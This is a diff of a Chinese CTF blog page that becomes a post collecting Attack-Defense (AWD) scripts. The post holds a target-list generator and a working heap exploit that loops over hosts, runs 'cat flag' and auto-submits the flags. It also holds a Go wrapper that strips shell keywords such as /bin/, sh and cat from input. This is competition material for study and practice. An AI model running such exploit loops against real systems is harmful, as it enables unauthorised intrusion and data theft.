@@ -6,13 +6,29 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>WMBa0</title>
+  <title>AWD-Pwn脚本汇总 | WMBa0</title>
   <meta name="author" content="WMBa0 &#39;s">
+  
+  <meta name="description" content="今天在整理语雀知识库的时候，整理之前参加awd的时候的脚本。
+那时候pwn没咋学，总结一下：
+（后面如果有机会还会在传）
+自动get ip脚本12345filename = &amp;#x27;url.txt&amp;#x27;with open(filename,&amp;#x27;w&amp;#x27;) as f:    for i in range(255):        url=&amp;quot;127.0.&amp;quot;+str(i)+&amp;quot;.1:9999\n&amp;quot;        f.write(url)
+
+
+
+自动攻击+提交pip install request
+1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#攻击函数，可以自定义def pwn(host,port):    context(os=&amp;quot;linux&amp;quot;,arch=&amp;quot;amd64&amp;quot;,timeout=30)    # context.log_level=&amp;quot;DEBUG&amp;quot;     p=remote(host,port)    context.terminal = [&amp;#x27;tmux&amp;#x27;, &amp;#x27;split&amp;#x27;, &amp;#x27;-h&amp;#x27;]    elf=ELF(&amp;quot;./main&amp;quot;)    libc=ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)    # gdb.attach(p,&amp;quot;b *0x400bd0&amp;quot;)     newpost(p,&amp;quot;AAAAAA&amp;quot;)#0     newpost(p,&amp;quot;BBBBBBB&amp;quot;)#1     unsort(p,&amp;quot;6666666&amp;quot;) #2     newpost(p,&amp;quot;hhhhh&amp;quot;) #3 0x6020b8     #pause()     delete(p,&amp;quot;2&amp;quot;)    newpost(p,&amp;quot;&amp;quot;)    show(p)    libc.address=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;,timeout=3)[-6: ] + &amp;#x27;\0\0&amp;#x27;)-  250-0x3c4b10    success(&amp;quot;libc -&amp;gt; &amp;#123;:#x&amp;#125;&amp;quot;.format(libc.address))    delete(p,&amp;quot;0&amp;quot;)    delete(p,&amp;quot;1&amp;quot;)    delete(p,&amp;quot;0&amp;quot;)    # pause()     newpost(p,p64(0x60208d))    # pause()     newpost(p,&amp;quot;/bin/sh\0&amp;quot;)    #pause()     newpost(p,&amp;quot;&amp;quot;)    ioaddr=0x7f55aab438e0-0x7f55aa77f000    ####test # newpost(p,&amp;quot;&amp;quot;) # pause()     ####test     newpost(p,&amp;#x27;qrstuvwxyz&amp;#x27;+&amp;quot;ABCDEFGHIJKLMNOPQ&amp;quot;+p64(0x602018))    p.sendlineafter(&amp;quot;Your Choice:&amp;quot;,&amp;quot;2&amp;quot;)    p.sendlineafter(&amp;quot;Enter the Index:&amp;quot;,&amp;quot;3&amp;quot;)    content=p64(libc.address+283536)[:-1]    p.sendafter(&amp;quot;Enter the Content:&amp;quot;,content)    #edit(&amp;quot;4&amp;quot;,&amp;quot;/bin/sh&amp;quot;)     #pause()     delete(p,&amp;quot;6&amp;quot;)    p.sendline(&amp;quot;cat flag&amp;quot;)    flag=p.recvline()    p.close()##！！！！！！！！！！！！！！！！！！！！！重要     return flag    #################这些都不重要################################################### def newpost(p,content):    p.sendlineafter(&amp;quot;Your Choice:&amp;quot;,&amp;quot;1&amp;quot;)    p.sendlineafter(&amp;quot;Enter the Content:&amp;quot;,content)    p.recvline()def edit(p,index,content):    p.sendlineafter(&amp;quot;Your Choice:&amp;quot;,&amp;quot;2&amp;quot;)    p.sendlineafter(&amp;quot;Enter the Index:&amp;quot;,index)    p.sendlineafter(&amp;quot;Enter the Content:&amp;quot;,content)def delete(p,index):    p.sendlineafter(&amp;quot;Your Choice:&amp;quot;,&amp;quot;3&amp;quot;)    p.sendlineafter(&amp;quot;Enter the Index:&amp;quot;,index)def show(p):    p.sendlineafter(&amp;quot;Your Choice:&amp;quot;,&amp;quot;4&amp;quot;)def unsort(p,content):    p.sendlineafter(&amp;quot;Your Choice:&amp;quot;,&amp;quot;5&amp;quot;)    p.sendlineafter(&amp;quot;Enter the Content:&amp;quot;,content)#自动提交flagdef submit(flag, token):    url = &amp;quot;xxxx&amp;quot;    pos = &amp;#123;        &amp;quot;flag&amp;quot;:flag,        &amp;quot;token&amp;quot;:token    &amp;#125;    print &amp;quot;[+] Submiting flag : [%s]&amp;quot; % (pos)    response = requests.post(url,data=data)    content = response.content    print &amp;quot;[+] Content : %s &amp;quot; % (content)    if failed in content:        print &amp;quot;[-]failed&amp;quot;        return False    else:        print &amp;quot;[+] Success!&amp;quot;        return Truedef exploit(host,port):	try:		#pwn是攻击函数		flag = pwn(host,port)		#提交flag的submit函数		submit(flag,token)	except Exception as m:		print(m)def exploit_it():	#打开目标	with open(&amp;quot;url.txt&amp;quot;) as f :		for line in f:			#分割ip和端口			host = line.split(&amp;quot;:&amp;quot;)[0]			port = int(line.split(&amp;quot;:&amp;quot;)[1])			print(&amp;quot;[+] Exploiting:%s:%d&amp;quot; % (host,port))			#执行攻击脚本			exploit(host,port)
+
+
+
+
+
+pwnwaf-go语言版1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192package mainimport (    &amp;quot;bufio&amp;quot;    &amp;quot;fmt&amp;quot;    &amp;quot;os&amp;quot;    &amp;quot;os/exec&amp;quot;    &amp;quot;regexp&amp;quot;    &amp;quot;strconv&amp;quot;    &amp;quot;sync&amp;quot;    &amp;quot;time&amp;quot;)//他大概的功能是匹配关键命令，替换为空，匹配flag文件，返回空内容。并将过程写入日志var wg sync.WaitGroupconst (    pwnPath = &amp;quot;./tmp/nysec&amp;quot;  //替换为要保护的pwn    logPath = &amp;quot;./tmp/pwnone_log/&amp;quot;  //替换为可读可写的 日志目录)func main() &amp;#123;    fmt.Println(&amp;quot;该文件由Pwnwaf进行保护&amp;quot;)    _,err := os.Stat(logPath) //判断./tmp/nysec是否存在    if err != nil &amp;#123;         //os.Mkdir(logPath, 0777) //如果文件夹不存在则创建文件夹        os.MkdirAll(logPath,0777)    &amp;#125;    logfileName := time.Now().Format(&amp;quot;15_04_05&amp;quot;) + &amp;quot;_&amp;quot; + strconv.FormatInt(time.Now().UnixNano() / 1e6,10) + &amp;quot;.log&amp;quot;    //time.Now().Format(&amp;quot;15_04_05&amp;quot;)获取当前时间格式化当前时间    //strconv.FormatInt(time.Now().UnixNano() / 1e6,10)：相当于随机数，这个数随着时间的推移而增大    logfileName = logPath + logfileName    f,err := os.OpenFile(logfileName,os.O_CREATE|os.O_WRONLY, os.ModePerm)    //创建为logfileName的文件    //os.O_CREATE|os.O_WRONLY：如果文件已存在，则会覆盖写，不会清空原来的文件，而是直接从头开始覆盖    fwriter := bufio.NewWriter(f) //创建默认大小的缓冲区    defer func() &amp;#123; //匿名函数最后执行        fwriter.Flush() //将缓冲区文件写入到文件中        f.Close()    &amp;#125;()    pwnCmd := exec.Command(pwnPath) //运行nysec文件，即运行pwn文件    pwnIn,_ := pwnCmd.StdinPipe() //标准输入重定向到PwnIn    pwnOut,_ := pwnCmd.StdoutPipe()//标准输出重定向到PwnOut    pwnCmd.Start() //立即执行pwn文件    wg.Add(1)     //一个 WaitGroup 对象可以等待一组协程结束    //wg.Add(int) 设置协程的个数，然后创建worker协程    go func() &amp;#123; //创建协程--output        dangerExp := regexp.MustCompile(&amp;quot;flag\\&amp;#123;.*?&amp;#125;&amp;quot;) //正则匹配        for &amp;#123;            output := make([]byte,1024) //创建切片            length,err := pwnOut.Read(output)  //将pwnOut读入到output中            if err != nil&amp;#123;                wg.Done() //协程结束后都要调用 wg.Done()；                return            &amp;#125;            output = output[:length] //从第一个元素开始到output            fwriter.WriteString(&amp;quot;send: \n&amp;quot;)            fwriter.Write(output)            fwriter.WriteString(&amp;quot;\n&amp;quot;)            fmt.Print(string(dangerExp.ReplaceAll(output,[]byte&amp;#123;&amp;#125;))) //将output中的某些特殊字符正则匹配为空        &amp;#125;    &amp;#125;()    go func() &amp;#123;//input        //创建正则表达式，匹配输入是否包含以下指令        dangerExp := regexp.MustCompile(&amp;quot;/bin/|cat|flag|sh|tac|strings|head|tail|base64&amp;quot;)        for &amp;#123;            input := make([]byte,1024)            length,err := os.Stdin.Read(input) 	//读取输入            if err != nil&amp;#123;                wg.Done()                return            &amp;#125;            input = input[:length]            //将获取的输入写入文件            fwriter.WriteString(&amp;quot;receive: \n&amp;quot;)            fwriter.Write(input)            fwriter.WriteString(&amp;quot;\n&amp;quot;)            //使用空白，替换 危险的关键字，使用正则表达式            input = dangerExp.ReplaceAll(input,[]byte&amp;#123;&amp;#125;)            //替换后的输入，写入pwnIn            _, err = pwnIn.Write(input)            if err != nil &amp;#123;                wg.Done() //协程结束后都要调用 wg.Done()；                return            &amp;#125;        &amp;#125;    &amp;#125;()    wg.Wait() //main协程调用 wg.Wait() 阻塞等待所有协程执行完毕后返回&amp;#125;"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  
+  <meta property="og:title" content="AWD-Pwn脚本汇总"/>
   <meta property="og:site_name" content="WMBa0"/>
 
   
@@ -107,51 +123,29 @@
 
   <div class="container">
   	<div class="content">
-    	 <div class="page-header logo">
-  <h1>WMBa0<span class="blink-fast">|</span></h1>
-</div>
+    	 
 
-<div class="row page">
 
 	
+		<div class="page-header">
+			<h1> AWD-Pwn脚本汇总</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
 	<div class="col-md-9">
 	
 
-		<div class="slogan">
+	<!-- content -->
+	<div class="mypage">		
+	  		
 
-
-		<i class="fa fa-heart blink-slow"></i>
-
-		一个热爱技术的white hacker. Love Pwn &amp; WEB &amp; Android Reverse
-
-</div>    
-
-		<div id="top_search"></div>
-		<div class="mypage">
-		
-		<!-- title and entry -->
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2025/03/15/AWD-Pwn脚本汇总/" >AWD-Pwn脚本汇总</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2025-03-15  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>今天在整理语雀知识库的时候，整理之前参加awd的时候的脚本。</p>
+	  <p>今天在整理语雀知识库的时候，整理之前参加awd的时候的脚本。</p>
 <p>那时候pwn没咋学，总结一下：</p>
 <p>（后面如果有机会还会在传）</p>
 <h2 id="自动get-ip脚本"><a href="#自动get-ip脚本" class="headerlink" title="自动get ip脚本"></a>自动get ip脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;url.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        url=<span class="string">&quot;127.0.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.1:9999\n&quot;</span></span><br><span class="line">        f.write(url)</span><br></pre></td></tr></table></figure>
@@ -166,211 +160,102 @@
 
 
 <h2 id="pwnwaf-go语言版"><a href="#pwnwaf-go语言版" class="headerlink" title="pwnwaf-go语言版"></a>pwnwaf-go语言版</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">//他大概的功能是匹配关键命令，替换为空，匹配flag文件，返回空内容。并将过程写入日志</span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">    pwnPath = <span class="string">&quot;./tmp/nysec&quot;</span>  //替换为要保护的pwn</span><br><span class="line">    logPath = <span class="string">&quot;./tmp/pwnone_log/&quot;</span>  //替换为可读可写的 日志目录</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;该文件由Pwnwaf进行保护&quot;</span>)</span><br><span class="line">    _,err := os.Stat(logPath) //判断./tmp/nysec是否存在</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123; </span><br><span class="line">        //os.Mkdir(logPath, 0777) //如果文件夹不存在则创建文件夹</span><br><span class="line">        os.MkdirAll(logPath,0777)</span><br><span class="line">    &#125;</span><br><span class="line">    logfileName := time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>) + <span class="string">&quot;_&quot;</span> + strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">    //time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>)获取当前时间格式化当前时间</span><br><span class="line">    //strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>)：相当于随机数，这个数随着时间的推移而增大</span><br><span class="line">    logfileName = logPath + logfileName</span><br><span class="line">    f,err := os.OpenFile(logfileName,os.O_CREATE|os.O_WRONLY, os.ModePerm)</span><br><span class="line">    //创建为logfileName的文件</span><br><span class="line">    //os.O_CREATE|os.O_WRONLY：如果文件已存在，则会覆盖写，不会清空原来的文件，而是直接从头开始覆盖</span><br><span class="line">    fwriter := bufio.NewWriter(f) //创建默认大小的缓冲区</span><br><span class="line">    defer func() &#123; //匿名函数最后执行</span><br><span class="line">        fwriter.Flush() //将缓冲区文件写入到文件中</span><br><span class="line">        f.Close()</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    pwnCmd := <span class="built_in">exec</span>.Command(pwnPath) //运行nysec文件，即运行pwn文件</span><br><span class="line">    pwnIn,_ := pwnCmd.StdinPipe() //标准输入重定向到PwnIn</span><br><span class="line">    pwnOut,_ := pwnCmd.StdoutPipe()//标准输出重定向到PwnOut</span><br><span class="line">    pwnCmd.Start() //立即执行pwn文件</span><br><span class="line">    wg.Add(<span class="number">1</span>) </span><br><span class="line">    //一个 WaitGroup 对象可以等待一组协程结束</span><br><span class="line">    //wg.Add(<span class="built_in">int</span>) 设置协程的个数，然后创建worker协程</span><br><span class="line">    go func() &#123; //创建协程--output</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;flag\\&#123;.*?&#125;&quot;</span>) //正则匹配</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            output := make([]byte,<span class="number">1024</span>) //创建切片</span><br><span class="line">            length,err := pwnOut.Read(output)  //将pwnOut读入到output中</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            output = output[:length] //从第一个元素开始到output</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;send: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(output)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            fmt.Print(string(dangerExp.ReplaceAll(output,[]byte&#123;&#125;))) //将output中的某些特殊字符正则匹配为空</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    go func() &#123;//<span class="built_in">input</span></span><br><span class="line">        //创建正则表达式，匹配输入是否包含以下指令</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;/bin/|cat|flag|sh|tac|strings|head|tail|base64&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">input</span> := make([]byte,<span class="number">1024</span>)</span><br><span class="line">            length,err := os.Stdin.Read(<span class="built_in">input</span>) 	//读取输入</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">input</span> = <span class="built_in">input</span>[:length]</span><br><span class="line">            //将获取的输入写入文件</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;receive: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(<span class="built_in">input</span>)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            //使用空白，替换 危险的关键字，使用正则表达式</span><br><span class="line">            <span class="built_in">input</span> = dangerExp.ReplaceAll(<span class="built_in">input</span>,[]byte&#123;&#125;)</span><br><span class="line">            //替换后的输入，写入pwnIn</span><br><span class="line">            _, err = pwnIn.Write(<span class="built_in">input</span>)</span><br><span class="line">            <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    wg.Wait() //main协程调用 wg.Wait() 阻塞等待所有协程执行完毕后返回</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2025/03/15/AWD-Pwn脚本汇总/#more" class="btn btn-default more">Read More</a>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
 </div>
 
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/" >【Pwn1】栈溢出+覆盖判断条件练习题</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2025-03-15  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>题目：</p>
-<p>通过网盘分享的文件：pwn1<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234">https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234</a> 提取码: 1234<br>（手机打开转存效果更佳）</p>
-<p>知识点：栈溢出理解</p>
-<p>先来复习一下，栈的结构和参数存储的位置</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142713291.png" alt="image-20250315142713100"></p>
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142722955.png" alt="image-20250315142722818"></p>
-<p>把a1替换为0x61616161</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142727498.png" alt="image-20250315142727399"></p>
-<p>gets() 函数不会限制用户输入的数据长度，而变量 s 的大小不是无限的</p>
-	
-	</div>
-  <a type="button" href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2025/03/14/2025腾讯面试一面总结/" >2025腾讯面试一面总结</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2025-03-14  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>面试岗位：做安全正向防护sdk的，web和移动端都有</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314111104988.png" alt="Snipaste_2025-03-14_10-46-52"></p>
-<p>大概面了40分钟，写代码写了20分钟</p>
-<h2 id="1、自我介绍"><a href="#1、自我介绍" class="headerlink" title="1、自我介绍"></a>1、自我介绍</h2><p>巴拉巴拉告诉自己擅长什么，打算干啥</p>
-<h2 id="2、介绍自己的项目经历（根据项目经历来问）"><a href="#2、介绍自己的项目经历（根据项目经历来问）" class="headerlink" title="2、介绍自己的项目经历（根据项目经历来问）"></a>2、介绍自己的项目经历（根据项目经历来问）</h2><p>Android 渗透印象最深刻的漏洞？</p>
-<p>360免费版和360企业版主要的区别？</p>
-<p>Frida检测如何绕过？</p>
-<p>如果你是正向人员，如何隐藏Frida检测？</p>
-	
-	</div>
-  <a type="button" href="/2025/03/14/2025腾讯面试一面总结/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2025/03/12/www-zip文件泄露题目实战/" >www.zip文件泄露题目实战</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2025-03-12  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p>给了这样的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113600553.png" alt="image-20250314113600471"></p>
-<p>登录和密码，源码泄露</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113622381.png" alt="image-20250314113622338"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113633453.png" alt="image-20250314113633380"></p>
-<p>看到有个info.php，访问他，flag在环境变量里</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113646833.png" alt="image-20250314113646777"></p>
-
-	
-	</div>
-  <a type="button" href="/2025/03/12/www-zip文件泄露题目实战/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-
-		</div>
-
-		<!-- pagination -->
-		<div>
-  		<center>
-		<div class="pagination">
-
-   
-</div>
-
-  		</center>
-		</div>
-
-		
-		
-	</div> <!-- col-md-9 -->
-
-	
-		<div class="col-md-3">
-	<div id="sidebar">
-	
-			
-  <div id="site_search">
-   <div class="form-group">
-    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
-   </div>  
-  <div id="local-search-result"></div>
-  </div>
-
-
-		
-			
-		
-			
-	<div class="widget">
-		<h4>Tag Cloud</h4>
-		<ul class="tag_box inline list-unstyled">		
-		
-			<li><a href="/tags/生活/">生活<span>1</span></a></li>
-		
-			<li><a href="/tags/AWD/">AWD<span>1</span></a></li>
-		
-			<li><a href="/tags/Pwn/">Pwn<span>1</span></a></li>
-		
-			<li><a href="/tags/WEB/">WEB<span>1</span></a></li>
-		
-		 
-		</ul>
 	</div>
 
+	
+	
+	<div>
+  	<center>
 
-		
-			
-<div class="widget">
-  <h4>Recent Posts</h4>
-  <ul class="entry list-unstyled">
+	<div class="pagination">
+
     
-      <li>
-        <a href="/2025/03/15/AWD-Pwn脚本汇总/" ><i class="fa fa-file-o"></i>AWD-Pwn脚本汇总</a>
-      </li>
     
-      <li>
-        <a href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/" ><i class="fa fa-file-o"></i>【Pwn1】栈溢出+覆盖判断条件练习题</a>
-      </li>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
-      <li>
-        <a href="/2025/03/14/2025腾讯面试一面总结/" ><i class="fa fa-file-o"></i>2025腾讯面试一面总结</a>
-      </li>
-    
-      <li>
-        <a href="/2025/03/12/www-zip文件泄露题目实战/" ><i class="fa fa-file-o"></i>www.zip文件泄露题目实战</a>
-      </li>
-    
-  </ul>
-</div>
 
-		
-			
-<div class="widget">
-	<h4>Links</h4>
-	<ul class="blogroll list-unstyled">
-	
-		<li><i class="false"></i><a href="https://github.com/WMBa0" title="" target="_blank"]);">WMBa0个人博客</a></li>
-	
-	</ul>
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
 </div>
 
 
-		
-	</div> <!-- sidebar -->
-</div> <!-- col-md-3 -->
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
 
 	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
 	
-</div> <!-- row-fluid -->
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-03-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/AWD/">AWD<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
 	</div>
   </div>
   <div class="container-narrow">
